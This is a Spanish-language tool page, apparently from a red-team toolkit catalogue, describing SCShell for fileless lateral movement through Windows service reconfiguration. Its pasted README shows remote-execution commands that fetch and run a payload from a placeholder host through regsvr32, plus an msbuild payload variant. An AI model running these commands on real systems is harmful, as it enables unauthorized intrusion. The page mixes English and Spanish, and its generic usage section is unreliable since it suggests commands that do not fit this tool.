---
title: "SCShell: Fileless lateral movement tool that relies on ChangeServiceConfigA to run comman"
slug: "scshell"
summary: "Fileless lateral movement tool that relies on ChangeServiceConfigA to run command"
category: "ciberseguridad"
level: "Intermedio"
reading: 6
tags: ['lateral-movement', 'red-team']
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es SCShell

SCShell es una herramienta de seguridad ofensiva / red team. Fileless lateral movement tool that relies on ChangeServiceConfigA to run command

Forma parte del ecosistema de herramientas de adversary simulation y es útil para comprender cómo operan los atacantes y cómo detectar sus técnicas.

- **Repositorio oficial:** [https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)
- **Sección del toolkit:** Lateral Movement 

## Objetivo y función

El objetivo principal de SCShell es fileless lateral movement tool that relies on changeserviceconfiga to run command.

En un engagement de red team, esta herramienta se usa para automatizar o simplificar una fase concreta del ataque (reconocimiento, acceso inicial, movimiento lateral, evasión, etc.), reduciendo el tiempo manual y aumentando la cobertura.

## Instalación

The current build is written in `C` but I will port it to `C#` and `PowerShell`.

```
Usage:
SCShell.exe target service payload domain username password
```

`target` can be set to `local` to run the payload locally

Remote execution
```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" . administrastor Password
```

I recommend using `C:\windows\system32\cmd.exe /c` to make sure to payload will not be killed once the service stop. You NEED to use the full path.

You can also use a msbuild payload
```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj" . administrator Password
SCShell ***
Trying to connect to 192.168.197.131
Username was provided attempting to call LogonUserA
SC_HANDLE Manager 0x009ED250
Opening XblAuthManager
SC_HANDLE Service 0x009ED1B0
Service path was changed to C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj
Service was started.
```

I'm using the XblAuthManager as the target which is the Xbox Accessory Management Service

## Uso básico

Consulta el README oficial para la sintaxis exacta. Un flujo típico:

```bash
# Clonar
git clone https://github.com/Mr-Un1k0d3r/SCShell
cd scshell

# Revisar ayuda
./scshell --help 2>/dev/null || python3 -m scshell --help 2>/dev/null || true
```

> Adapta los comandos a tu entorno. Muchas de estas herramientas requieren privilegios elevados o sistemas Windows/Active Directory.

## ¿Se puede usar en Termux?

Este repositorio puede instalarse en Termux si el dispositivo cumple los requisitos (Python/Go/Rust y dependencias). En Android, ejecuta los comandos dentro de Termux y verifica permisos de red/almacenamiento.

## Buenas prácticas y ética

Usa SCShell únicamente en entornos que poseas o para los que tengas autorización escrita. El uso no autorizado es ilegal. En laboratorios, monta una VM aislada y una red de pruebas.

## Referencias

- Repositorio: https://github.com/Mr-Un1k0d3r/SCShell
- Toolkit de origen: Red Teaming Toolkit
